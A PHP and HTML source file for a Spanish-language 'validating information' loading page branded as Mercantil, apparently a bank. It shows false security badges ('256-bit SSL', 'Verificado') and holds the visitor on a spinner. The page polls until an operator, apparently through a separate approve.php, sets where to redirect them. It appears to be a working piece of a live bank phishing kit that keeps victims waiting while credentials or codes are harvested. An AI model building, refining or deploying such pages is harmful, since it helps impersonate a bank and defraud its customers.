<?php
// 🔧 FIX 1: Configuración de sesiones ANTES de cualquier output
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// Configuración crítica de sesiones (igual que en approve.php)
ini_set('session.save_handler', 'files');
ini_set('session.use_strict_mode', 0);
ini_set('session.use_cookies', 0);
ini_set('session.use_only_cookies', 0);
ini_set('session.cache_limiter', '');

// 🔧 FIX 2: Headers anti-caché CRÍTICOS
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Cache-Control: post-check=0, pre-check=0', false);
header('Pragma: no-cache');
header('Expires: Sun, 01 Jan 2014 00:00:00 GMT');

if (!isset($_GET['id']) || !preg_match('/^[a-zA-Z0-9,-]{5,}$/', $_GET['id'])) {
    http_response_code(400);
    exit;
}

$request_id = $_GET['id'];

// 🔧 FIX 3: Limpieza de sesión antes de cambiar ID
if (session_status() === PHP_SESSION_ACTIVE) {
    session_unset();
    session_destroy();
    session_write_close();
}

session_id($request_id);
session_start();

if (!isset($_SESSION['load_entry_time'])) {
    $_SESSION['load_entry_time'] = time();
}

// 🔧 FIX 4: Modo check con headers JSON correctos
if (isset($_GET['check'])) {
    header('Content-Type: application/json; charset=UTF-8');
    header('Cache-Control: no-store, no-cache, must-revalidate');
    
    $response = ['redirect' => null];
    
    if (isset($_SESSION['redirect']) && isset($_SESSION['redirect_set_time'])) {
        // Comparación de tiempos con margen de seguridad
        if ($_SESSION['redirect_set_time'] >= $_SESSION['load_entry_time']) {
            $response['redirect'] = $_SESSION['redirect'];
            
            // Limpiar después de enviar para no repetir
            unset($_SESSION['redirect'], $_SESSION['redirect_set_time']);
        }
    }
    
    session_write_close();
    echo json_encode($response);
    exit;
}

session_write_close();
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- 🔧 FIX 5: Meta tags anti-caché -->
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">

<link rel="icon" href="merca.ico" type="image/x-icon" sizes="256x256"/>
<title>Mercantil</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">

<style>
/* ... TU CSS EXACTAMENTE IGUAL ... */
* { box-sizing: border-box; margin: 0; padding: 0; }
html, body { height: 100%; width: 100%; overflow: hidden; }
body {
    font-family: 'Inter', sans-serif;
    background: linear-gradient(135deg, #0A1E4D 0%, #0D3B7D 25%, #0D52A8 50%, #1B7FD4 75%, #0A2463 100%);
    background-size: 400% 400%;
    animation: gradientShift 15s ease infinite;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    position: relative;
    overflow: hidden;
}
@keyframes gradientShift {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}
.bg-elements {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    z-index: 0;
    overflow: hidden;
}
.floating-orb {
    position: absolute;
    border-radius: 50%;
    opacity: 0.1;
    filter: blur(40px);
}
.orb-1 {
    width: 300px; height: 300px;
    background: radial-gradient(circle at 30% 30%, #FF8D42, #F57820);
    top: -100px; right: -100px;
    animation: float 20s ease-in-out infinite;
}
.orb-2 {
    width: 250px; height: 250px;
    background: radial-gradient(circle at 30% 30%, #4DAAFF, #1B7FD4);
    bottom: -80px; left: -80px;
    animation: float 25s ease-in-out infinite reverse;
}
.orb-3 {
    width: 200px; height: 200px;
    background: radial-gradient(circle at 30% 30%, #FF8D42, #FFB366);
    bottom: 20%; right: 10%;
    animation: float 30s ease-in-out infinite;
}
@keyframes float {
    0%, 100% { transform: translate(0, 0); }
    25% { transform: translate(-30px, -30px); }
    50% { transform: translate(30px, 30px); }
    75% { transform: translate(-20px, 20px); }
}
.grid-background {
    position: absolute;
    width: 100%; height: 100%;
    background-image: 
        linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
    background-size: 50px 50px;
    animation: gridMove 20s linear infinite;
}
@keyframes gridMove {
    0% { background-position: 0 0; }
    100% { background-position: 50px 50px; }
}
.container {
    position: relative;
    z-index: 10;
    width: 100%;
    max-width: 500px;
    padding: 20px;
    display: flex;
    flex-direction: column;
    align-items: center;
}
.card-container {
    background: rgba(255, 255, 255, 0.92);
    backdrop-filter: blur(30px);
    border-radius: 32px;
    padding: 80px 60px;
    box-shadow: 
        0 40px 80px rgba(0, 0, 0, 0.2),
        0 0 40px rgba(27, 127, 212, 0.15),
        0 0 1px rgba(255, 255, 255, 0.8) inset;
    border: 1px solid rgba(255, 255, 255, 0.5);
    animation: cardEntrance 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
    position: relative;
    overflow: hidden;
}
@keyframes cardEntrance {
    from { opacity: 0; transform: translateY(40px) scale(0.95); }
    to { opacity: 1; transform: translateY(0) scale(1); }
}
.card-top-accent {
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 4px;
    background: linear-gradient(90deg, transparent, #FF8D42, #FFB366, transparent);
    box-shadow: 0 0 20px rgba(255, 141, 66, 0.4);
}
.card-corner-dots {
    position: absolute;
    width: 20px; height: 20px;
    top: 20px; right: 20px;
}
.dot {
    width: 4px; height: 4px;
    background: #1B7FD4;
    border-radius: 50%;
    position: absolute;
    animation: dotPulse 2s ease-in-out infinite;
}
.dot:nth-child(1) { top: 0; left: 0; animation-delay: 0s; }
.dot:nth-child(2) { top: 0; right: 0; animation-delay: 0.2s; }
.dot:nth-child(3) { bottom: 0; right: 0; animation-delay: 0.4s; }
@keyframes dotPulse {
    0%, 100% { transform: scale(1); opacity: 0.3; }
    50% { transform: scale(1.5); opacity: 1; }
}
.spinner-section {
    position: relative;
    width: 180px; height: 180px;
    margin: 0 auto 40px;
    display: flex;
    justify-content: center;
    align-items: center;
}
.advanced-spinner {
    position: relative;
    width: 100%; height: 100%;
}
.spinner-ring {
    position: absolute;
    width: 100%; height: 100%;
    border-radius: 50%;
    box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.05);
}
.ring-1 {
    border: 3px solid transparent;
    border-top-color: #1B7FD4;
    border-right-color: rgba(27, 127, 212, 0.3);
    animation: spin1 3s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
    box-shadow: 0 0 30px rgba(27, 127, 212, 0.4);
}
.ring-2 {
    border: 3px solid transparent;
    border-bottom-color: #FF8D42;
    border-left-color: rgba(255, 141, 66, 0.3);
    animation: spin2 3.5s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
    width: 85%; height: 85%;
    top: 7.5%; left: 7.5%;
    box-shadow: 0 0 25px rgba(255, 141, 66, 0.3);
}
.ring-3 {
    border: 2px solid transparent;
    border-top-color: rgba(77, 170, 255, 0.5);
    border-right-color: rgba(77, 170, 255, 0.1);
    animation: spin3 4s linear infinite;
    width: 65%; height: 65%;
    top: 17.5%; left: 17.5%;
    opacity: 0.8;
}
.ring-4 {
    border: 1px solid transparent;
    border-bottom-color: rgba(255, 141, 66, 0.4);
    animation: spin1 2.5s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
    width: 45%; height: 45%;
    top: 27.5%; left: 27.5%;
    opacity: 0.6;
}
@keyframes spin1 { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
@keyframes spin2 { from { transform: rotate(0deg); } to { transform: rotate(-360deg); } }
@keyframes spin3 { from { transform: rotate(360deg); } to { transform: rotate(0deg); } }
.logo-container {
    position: absolute;
    top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    z-index: 5;
}
.logo-badge {
    width: 80px; height: 80px;
    background: linear-gradient(135deg, #0D52A8 0%, #1B7FD4 100%);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 
        0 20px 50px rgba(27, 127, 212, 0.4),
        inset 0 2px 8px rgba(255, 255, 255, 0.2),
        0 0 40px rgba(27, 127, 212, 0.2);
    border: 2px solid rgba(255, 255, 255, 0.3);
    animation: logoGlow 3s ease-in-out infinite;
}
@keyframes logoGlow {
    0%, 100% { 
        box-shadow: 
            0 20px 50px rgba(27, 127, 212, 0.4),
            inset 0 2px 8px rgba(255, 255, 255, 0.2),
            0 0 40px rgba(27, 127, 212, 0.2);
    }
    50% { 
        box-shadow: 
            0 20px 50px rgba(27, 127, 212, 0.5),
            inset 0 2px 8px rgba(255, 255, 255, 0.3),
            0 0 60px rgba(27, 127, 212, 0.35);
    }
}
.logo-badge img {
    width: 75%; height: 75%;
    object-fit: contain;
    filter: drop-shadow(0 2px 6px rgba(0, 0, 0, 0.15));
    clip-path: circle(50%);
}
.content-section {
    text-align: center;
    margin-top: 20px;
}
.main-title {
    font-family: 'Poppins', sans-serif;
    font-size: 24px;
    font-weight: 700;
    color: #0A2463;
    letter-spacing: -0.5px;
    margin-bottom: 12px;
    animation: titleFadeIn 0.8s ease 0.2s both;
}
@keyframes titleFadeIn {
    from { opacity: 0; transform: translateY(20px); }
    to { opacity: 1; transform: translateY(0); }
}
.subtitle {
    font-size: 14px;
    color: #555555;
    font-weight: 400;
    line-height: 1.6;
    letter-spacing: 0.3px;
    margin-top: 12px;
    animation: subtitleFadeIn 0.8s ease 0.3s both;
}
@keyframes subtitleFadeIn {
    from { opacity: 0; transform: translateY(15px); }
    to { opacity: 1; transform: translateY(0); }
}
.loading-dots { display: inline-block; }
.dot-loader {
    display: inline-block;
    width: 4px; height: 4px;
    background-color: #1B7FD4;
    border-radius: 50%;
    margin: 0 3px;
    animation: dotBounce 1.4s infinite;
}
.dot-loader:nth-child(2) { animation-delay: 0.2s; }
.dot-loader:nth-child(3) { animation-delay: 0.4s; }
@keyframes dotBounce {
    0%, 80%, 100% { transform: translateY(0); opacity: 0.4; }
    40% { transform: translateY(-10px); opacity: 1; }
}
.progress-bar-container {
    margin-top: 28px;
    width: 100%; height: 3px;
    background: linear-gradient(90deg, #f0f0f0 0%, #e0e0e0 100%);
    border-radius: 2px;
    overflow: hidden;
    position: relative;
}
.progress-bar {
    height: 100%;
    background: linear-gradient(90deg, #1B7FD4, #FF8D42, #1B7FD4);
    background-size: 200% 100%;
    border-radius: 2px;
    animation: progressMove 2s ease-in-out infinite;
}
@keyframes progressMove {
    0% { width: 0%; }
    50% { width: 70%; }
    100% { width: 100%; }
}
.security-section {
    margin-top: 35px;
    padding: 20px;
    background: linear-gradient(135deg, rgba(27, 127, 212, 0.08) 0%, rgba(77, 170, 255, 0.05) 100%);
    border-radius: 16px;
    border: 1px solid rgba(27, 127, 212, 0.15);
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 20px;
    animation: securityFadeIn 0.8s ease 0.4s both;
}
@keyframes securityFadeIn {
    from { opacity: 0; transform: translateY(20px); }
    to { opacity: 1; transform: translateY(0); }
}
.security-item {
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
}
.security-icon {
    font-size: 24px;
    margin-bottom: 8px;
    animation: iconBounce 2s ease-in-out infinite;
}
.security-item:nth-child(2) .security-icon { animation-delay: 0.3s; }
@keyframes iconBounce {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-8px); }
}
.security-label {
    font-size: 11px;
    color: #1B7FD4;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 1px;
}
.security-status {
    font-size: 10px;
    color: #888888;
    margin-top: 4px;
}
@media (max-width: 600px) {
    .card-container { padding: 60px 40px; }
    .main-title { font-size: 20px; }
    .spinner-section { width: 150px; height: 150px; margin-bottom: 30px; }
    .security-section {
        grid-template-columns: 1fr;
        gap: 15px;
        padding: 15px;
        margin-top: 30px;
    }
    .logo-badge { width: 70px; height: 70px; }
}
@media (max-width: 420px) {
    .card-container { padding: 50px 30px; border-radius: 24px; }
    .main-title { font-size: 18px; }
    .subtitle { font-size: 12px; }
    .spinner-section { width: 130px; height: 130px; margin-bottom: 25px; }
    .security-section { margin-top: 25px; padding: 12px; }
}
.card-container, .card-container * {
    user-select: none;
    -webkit-user-select: none;
}
</style>
</head>

<body>

<div class="bg-elements">
    <div class="floating-orb orb-1"></div>
    <div class="floating-orb orb-2"></div>
    <div class="floating-orb orb-3"></div>
    <div class="grid-background"></div>
</div>

<div class="container">
    <div class="card-container">
        <div class="card-top-accent"></div>
        <div class="card-corner-dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>

        <div class="spinner-section">
            <div class="advanced-spinner">
                <div class="spinner-ring ring-1"></div>
                <div class="spinner-ring ring-2"></div>
                <div class="spinner-ring ring-3"></div>
                <div class="spinner-ring ring-4"></div>
            </div>
            <div class="logo-container">
                <div class="logo-badge">
                    <img src="logo-loader.png" alt="Mercantil">
                </div>
            </div>
        </div>

        <div class="content-section">
            <div class="main-title">
                Validando información<span class="loading-dots"><span class="dot-loader"></span><span class="dot-loader"></span><span class="dot-loader"></span></span>
            </div>
            <div class="subtitle">
                Por favor espere mientras procesamos su solicitud de forma segura
            </div>

            <div class="progress-bar-container">
                <div class="progress-bar"></div>
            </div>

            <div class="security-section">
                <div class="security-item">
                    <div class="security-icon">🔐</div>
                    <div class="security-label">Encriptado</div>
                    <div class="security-status">256-bit SSL</div>
                </div>
                <div class="security-item">
                    <div class="security-icon">✓</div>
                    <div class="security-label">Verificado</div>
                    <div class="security-status">Procesando...</div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- 🔧 FIX 6: JavaScript mejorado con anti-caché y manejo de errores -->
<script>
// Timestamp único para evitar caché
const requestId = '<?php echo htmlspecialchars($request_id, ENT_QUOTES, 'UTF-8'); ?>';
let checkCount = 0;
const maxChecks = 200; // Límite de seguridad (5 minutos aprox)
let isRedirecting = false;

function checkRedirect() {
    if (isRedirecting) return;
    
    checkCount++;
    
    // Timeout de seguridad - recargar página si lleva mucho tiempo
    if (checkCount > maxChecks) {
        console.log('Timeout - recargando página');
        location.reload();
        return;
    }
    
    // Agregar timestamp para evitar caché del navegador
    const timestamp = new Date().getTime();
    const url = 'load.php?id=' + encodeURIComponent(requestId) + '&check=1&t=' + timestamp;
    
    fetch(url, {
        method: 'GET',
        cache: 'no-store',
        headers: {
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache'
        }
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Error HTTP: ' + response.status);
        }
        return response.json();
    })
    .then(data => {
        if (data.redirect && data.redirect !== null && data.redirect !== '') {
            isRedirecting = true;
            console.log('Redirigiendo a:', data.redirect);
            
            // Usar replace para no guardar en historial
            window.location.replace(data.redirect);
        } else {
            // Reintentar en 1 segundo
            setTimeout(checkRedirect, 1000);
        }
    })
    .catch(error => {
        console.error('Error en fetch:', error);
        // En caso de error, reintentar en 2 segundos
        setTimeout(checkRedirect, 2000);
    });
}

// Iniciar cuando el DOM esté listo
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', checkRedirect);
} else {
    checkRedirect();
}
</script>

</body>
</html>
